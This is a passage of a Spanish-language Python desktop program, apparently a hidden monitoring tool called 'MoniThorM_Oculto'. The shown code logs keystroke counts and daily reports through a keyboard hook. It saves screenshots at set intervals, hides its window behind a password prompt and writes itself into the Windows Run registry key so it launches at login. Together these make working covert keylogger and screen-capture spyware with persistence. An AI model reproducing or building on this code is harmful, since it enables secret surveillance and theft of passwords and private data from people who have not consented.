                self._guardar_buffer()
                ultimo_flush = time.time()
            nueva_ruta = self._obtener_ruta_reporte()
            if nueva_ruta != self.reporte_actual:
                self._guardar_buffer()
                self.reporte_actual = nueva_ruta
                self._escribir_encabezado_reporte()
                self.teclas_presionadas = 0
                self.lbl_contador.configure(text="Teclas registradas hoy: 0")
        keyboard.unhook_all()

    def ver_reporte_hoy(self):
        ruta_hoy = self._obtener_ruta_reporte()
        if os.path.exists(ruta_hoy):
            try:
                with open(ruta_hoy, 'r', encoding='utf-8') as f:
                    contenido = f.read()
                ventana_reporte = ctk.CTkToplevel(self.root)
                ventana_reporte.title(f"Reporte - {date.today().strftime('%d/%m/%Y')}")
                ventana_reporte.geometry("600x500")
                ventana_reporte.resizable(True, True)
                texto = ctk.CTkTextbox(ventana_reporte, width=580, height=450, font=("Consolas", 11))
                texto.pack(pady=10, padx=10, fill="both", expand=True)
                texto.insert("1.0", contenido)
                texto.configure(state="disabled")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo leer el reporte: {e}")
        else:
            messagebox.showinfo("Sin datos", "No hay registro para hoy.")

    def abrir_carpeta_logs(self):
        ruta_logs = self._obtener_ruta_logs()
        if os.path.exists(ruta_logs):
            os.startfile(ruta_logs)
        else:
            messagebox.showinfo("Sin logs", "La carpeta de logs no existe.")

    # ==================== AUTENTICACION ====================

    def mostrar_ventana_autenticacion(self):
        ahora = time.time()
        if (ahora - self.ultima_apertura_login) < self.DEBOUNCE_SEGUNDOS:
            return
        self.ultima_apertura_login = ahora

        if self.ventana_login and self.ventana_login.winfo_exists():
            self.ventana_login.lift()
            self.ventana_login.attributes("-topmost", True)
            self.ventana_login.focus_force()
            return

        if self.root.winfo_viewable():
            self.root.lift()
            self.root.attributes("-topmost", True)
            self.root.focus_force()
            self._crear_ventana_login()
            return

        self._crear_ventana_login()

    def _crear_ventana_login(self):
        self.ventana_login = ctk.CTkToplevel(self.root)
        self.ventana_login.title("Acceso Protegido")
        self.ventana_login.geometry("350x200")
        self.ventana_login.resizable(False, False)
        self.ventana_login.attributes("-topmost", True)

        lbl_indicacion = ctk.CTkLabel(self.ventana_login, text="Introduce la contrasena:", font=("Arial", 14, "bold"))
        lbl_indicacion.pack(pady=20)

        self.txt_password = ctk.CTkEntry(self.ventana_login, width=200, show="*", justify="center", font=("Arial", 16))
        self.txt_password.pack(pady=5)
        self.txt_password.focus()
        self.txt_password.bind("<Return>", lambda event: self.verificar_contrasena())

        btn_verificar = ctk.CTkButton(self.ventana_login, text="Entrar", width=120, command=self.verificar_contrasena)
        btn_verificar.pack(pady=15)

    def verificar_contrasena(self):
        if self.txt_password.get() == CONTRASENA_ACCESO:
            self.ventana_login.destroy()
            self.ventana_login = None
            self.root.deiconify()
            self.root.lift()
            self.root.attributes("-topmost", False)
            self.root.focus_force()
        else:
            messagebox.showerror("Error", "Contrasena incorrecta.")
            self.ventana_login.attributes("-topmost", True)
            self.txt_password.delete(0, "end")
            self.txt_password.focus()

    # ==================== METODOS GENERALES ====================

    def _obtener_nombre_intervalo(self, segundos):
        for nombre, valor in self.tiempos_map.items():
            if valor == segundos:
                return nombre
        return "10 segundos"

    def ocultar_ventana(self):
        self.root.withdraw()
        self.ultima_apertura_login = 0

    def seleccionar_carpeta(self):
        carpeta = filedialog.askdirectory()
        if carpeta:
            self.carpeta_destino = carpeta
            self.entry_carpeta.delete(0, "end")
            self.entry_carpeta.insert(0, carpeta)
            self.guardar_configuracion()

    def cambiar_tiempo(self, valor_seleccionado):
        self.intervalo_segundos = self.tiempos_map[valor_seleccionado]
        self.guardar_configuracion()

    def alternar_monitoreo(self):
        if not self.monitoreando:
            self.carpeta_destino = self.entry_carpeta.get()
            if not os.path.exists(self.carpeta_destino):
                try:
                    os.makedirs(self.carpeta_destino)
                except Exception as e:
                    messagebox.showerror("Error", f"No se pudo crear la carpeta: {e}")
                return
            self.monitoreando = True
            self.lbl_estado.configure(text="ESTADO: MONITOREANDO", text_color="green")
            self.btn_inicio.configure(text="Detener Monitoreo", fg_color="red", hover_color="darkred")
            self.hilo_captura = threading.Thread(target=self.bucle_capturas, daemon=True)
            self.hilo_captura.start()
        else:
            self.monitoreando = False
            self.lbl_estado.configure(text="ESTADO: APAGADO", text_color="red")
            self.btn_inicio.configure(text="Iniciar Monitoreo", fg_color="green", hover_color="darkgreen")

    def bucle_capturas(self):
        while self.monitoreando:
            try:
                ahora = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                ruta_completa = os.path.join(self.carpeta_destino, f"captura_{ahora}.png")
                pyautogui.screenshot().save(ruta_completa)
            except:
                pass
            time.sleep(self.intervalo_segundos)

    def configurar_inicio_automatico(self):
        clave_ruta = r"Software\Microsoft\Windows\CurrentVersion\Run"
        nombre_app = "MoniThorM_Oculto"
        ruta_script = os.path.abspath(sys.argv[0])
        self.inicio_automatico_guardado = (self.check_inicio.get() == 1)
        self.guardar_configuracion()
        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_ruta, 0, reg.KEY_SET_VALUE)
            if self.check_inicio.get() == 1:
                if ruta_script.endswith('.exe'):
                    reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{ruta_script}"')
                else:
                    reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{sys.executable}" "{ruta_script}"')
                messagebox.showinfo("Inicio Automatico", "Configurado con exito.")
            else:
                try:
                    reg.DeleteValue(clave, nombre_app)
                    messagebox.showinfo("Inicio Automatico", "Removido con exito.")
                except FileNotFoundError:
                    pass
                reg.CloseKey(clave)
        except Exception as e:
            messagebox.showerror("Error", f"Error de registro: {e}")


if __name__ == "__main__":
    MonitorApp()